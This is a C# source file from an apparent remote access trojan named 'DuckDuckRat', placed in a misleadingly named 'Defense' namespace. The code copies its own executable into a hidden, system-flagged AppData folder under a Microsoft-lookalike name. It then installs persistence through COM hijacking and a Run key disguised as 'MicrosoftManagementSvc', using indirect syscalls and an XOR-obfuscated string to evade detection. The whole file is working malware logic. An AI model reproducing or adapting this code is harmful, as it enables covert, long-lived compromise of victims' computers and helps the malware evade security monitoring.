using System;
using System.IO;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using DuckDuckRat;

namespace DuckDuckRat.Defense
{
    public static class PersistenceService
    {
        // [SENTINEL] Tier-1 Stealth Persistence (Indirect Syscalls Only)
        // Primary: COM Hijacking (Windows Media Center Proxy)
        // Fallback: Registry Run (NtSetValueKey)
        
        private const string COM_GUID = "{884e2008-217d-11da-b2a4-000e7bbb2c09}"; // Windows Media Center
        private static readonly byte[] _runKeyEnc = { 0x64, 0x18, 0x11, 0x03, 0x00, 0x16, 0x16, 0x02, 0x12, 0x47, 0x1A, 0x1E, 0x14, 0x05, 0x18, 0x14, 0x18, 0x11, 0x03, 0x47, 0x00, 0x1E, 0x17, 0x13, 0x18, 0x00, 0x04, 0x47, 0x14, 0x02, 0x05, 0x1D, 0x12, 0x17, 0x03, 0x36, 0x12, 0x05, 0x11, 0x1E, 0x18, 0x17, 0x47, 0x05, 0x02, 0x17 }; 

        private static string X(byte[] b) {
            byte[] d = new byte[b.Length];
            for (int i = 0; i < b.Length; i++) d[i] = (byte)(b[i] ^ 0x37);
            return Encoding.UTF8.GetString(d);
        }

        public static void InstallPersistence()
        {
            try
            {
                SyscallManager.Initialize();
                Console.WriteLine("[Ghost] Initializing Stealth Persistence sequence...");
                
                string ghostPath = GhostSelf();
                if (string.IsNullOrEmpty(ghostPath)) return;

                // 1. COM Hijacking (LocalServer32) - Primary
                bool comSvc = InstallComHijack(ghostPath);
                
                // 2. Registry Run - Fallback
                bool regRun = InstallRegistryRun(ghostPath);

                if (comSvc || regRun)
                    Console.WriteLine("[Ghost] Persistence verified. Beacon is now immortal.");
            }
            catch (Exception ex) { Console.WriteLine($"[Ghost] ERR: {ex.Message}"); }
        }

        public static bool InstallComHijack(string targetPath)
        {
            try
            {
                var ntCreateKey = SyscallManager.GetSyscallDelegate<NtCreateKey>("NtCreateKey");
                var ntSetValueKey = SyscallManager.GetSyscallDelegate<NtSetValueKey>("NtSetValueKey");
                if (ntCreateKey == null || ntSetValueKey == null) return false;

                string sid = WindowsIdentity.GetCurrent().User?.Value ?? "";
                string nativePath = $@"\Registry\User\{sid}\Software\Classes\CLSID\{COM_GUID}\LocalServer32";

                SyscallManager.OBJECT_ATTRIBUTES oa = new SyscallManager.OBJECT_ATTRIBUTES(nativePath, 0x40);
                IntPtr hKey; uint disp;
                uint status = ntCreateKey(out hKey, 0xF003F, ref oa, 0, IntPtr.Zero, 0, out disp);
                oa.Free();

                if (status == 0 && hKey != IntPtr.Zero)
                {
                    SyscallManager.UNICODE_STRING valName = new SyscallManager.UNICODE_STRING(""); // Default value
                    byte[] data = Encoding.Unicode.GetBytes(targetPath + "\0");
                    ntSetValueKey(hKey, ref valName, 0, 1, data, (uint)data.Length);
                    valName.Free();
                    NtClose(hKey);
                    return true;
                }
            } catch { }
            return false;
        }

        public static bool InstallRegistryRun(string targetPath)
        {
            try
            {
                var ntCreateKey = SyscallManager.GetSyscallDelegate<NtCreateKey>("NtCreateKey");
                var ntSetValueKey = SyscallManager.GetSyscallDelegate<NtSetValueKey>("NtSetValueKey");
                if (ntCreateKey == null || ntSetValueKey == null) return false;

                string sid = WindowsIdentity.GetCurrent().User?.Value ?? "";
                string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                string nativePath = $@"\Registry\User\{sid}\{subKey}";

                SyscallManager.OBJECT_ATTRIBUTES oa = new SyscallManager.OBJECT_ATTRIBUTES(nativePath, 0x40);
                IntPtr hKey; uint disp;
                uint status = ntCreateKey(out hKey, 0xF003F, ref oa, 0, IntPtr.Zero, 0, out disp);
                oa.Free();

                if (status == 0 && hKey != IntPtr.Zero)
                {
                    SyscallManager.UNICODE_STRING valName = new SyscallManager.UNICODE_STRING("MicrosoftManagementSvc");
                    byte[] data = Encoding.Unicode.GetBytes($"\"{targetPath}\" /background\0");
                    ntSetValueKey(hKey, ref valName, 0, 1, data, (uint)data.Length);
                    valName.Free();
                    NtClose(hKey);
                    return true;
                }
            } catch { }
            return false;
        }

        private static string GhostSelf()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string ghostDir = Path.Combine(appData, "Microsoft", "Windows", "SoftwareUpdate");
                if (!Directory.Exists(ghostDir)) Directory.CreateDirectory(ghostDir);
                
                string ghostName = "MicrosoftManagementSvc.exe";
                string ghostPath = Path.Combine(ghostDir, ghostName);

                string selfPath = Environment.ProcessPath ?? "";
                if (string.Compare(selfPath, ghostPath, StringComparison.OrdinalIgnoreCase) != 0)
                {
                    if (File.Exists(ghostPath)) {
                        try { File.Delete(ghostPath); } catch { }
                    }
                    File.Copy(selfPath, ghostPath, true);
                    File.SetAttributes(ghostPath, FileAttributes.Hidden | FileAttributes.System);
                }
                return ghostPath;
            }
            catch { return null; }
        }

        [DllImport("ntdll.dll")] private static extern uint NtClose(IntPtr handle);
    }
}


